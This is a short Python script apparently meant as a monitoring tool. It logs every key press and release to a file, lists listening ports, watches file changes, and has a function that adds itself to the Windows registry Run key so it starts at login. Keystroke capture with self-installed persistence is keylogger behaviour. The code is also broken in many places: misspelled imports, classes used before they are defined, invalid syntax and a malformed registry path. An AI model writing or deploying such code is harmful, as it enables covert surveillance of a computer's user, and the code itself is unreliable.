import os
import logging 
import psutil 
from watchdog.observers import Observer 
from wtachdog.events import FileSystemEventHandler 
from pyput import keyboard 

if __name__ == "__main__":
    log_file = 'system_changes.log'
    input_handler = InputHandler(log_file)
    port_handler = PortHandler(log_file)
    file_handler = FileHandler(log_file)

    with keyboard.Listener(on_press = input_handler.on_press, on_release = input_handler.on_release) as listener:
        while True:
            port_handler.check_ports()

#odserver = Observer()
#observer.schedule(file_handler, path = '.', recursive = True)
#observer.start()
#try:
#   while True:
#   pass 
#except keyboardInterrupt:
#   observer.stop()
#   observer.join()

logging.basicConfig(level = logging.INFO, format = '%(asctime)s - %(message)s', datefmt = '%Y-%m-%d %H:%M:%S')

class InputHandler:
    def __init__(self, log_file):
        self.log_file = log_file

    def on_press(self, key):
        logging.info(f"Key pressed: {key}")
        with open (self.log_file, 'a') as f:
            f.write(f"Key pressed: {key}\n")

    def on_release(self, key):
        logging.info(f"Key released: {key}")
        with open(self.log_file, 'a') as f:
            f.write(f"Key released: {key}\n")

class PortHandler:
    def __init__(self, log_file):
        self.log_file = log_file

    def check_ports(self):
        for conn in psutil.net_connections():
                if conn.status == 'LISTEN':
                logging.info(f"Port {conn.laddr.port} is being listened")
                with open (self.log_file, 'a') as f:
                    f.write(f"Port {conn.laddr.port} is being listened\n")

class FileHandler(FileSystemEventHandler):
    def __init__(self, log_file):
        self.log_file = log_file

    def on_created(self, event):
        if event.is_directory:
            logging.info(f"Directory created: {event.src_path}")
            with open(self.log_file, 'a') as f:
                fwrite(f"Directory created: {event.src_path}\n")

        else: 
            logging.info(f"File created: {event.src_path}")
            with open(self.log_file, 'a') as f:
                f.write(f"File created: {event.src_path}\n")

    def on_deleted(self, event):
        if event.is_directory:
            logging.info(f"Directory deleted: {event.src_path}")
            with open(self.log_file, 'a') as f:
                f.write(f"Directory deleted: {event.src_path}\n")

        else:
            logging.info(f"File deleted: {event.src_path}")
            with open(self.log_file, 'a') as f:
                f.write(f"File deleted: {event.src_path}\n")

def auto_load:
    autoname = "main.py"
    path = os.path.dirname(os.path.realpath(__file__))
    address = os.path.join(path, autoname)
    key_reg = OpenKey(HKEY_CURRENT_USER, 
                      r'SOFTWARE\Microsoft\Windows|CurrentVersion\Run',
                      0, KEY_ALL_ACCESS)
    setValueEx(key_reg, autoname, 0, REG_SZ,address)
    CloseKey(key_reg)
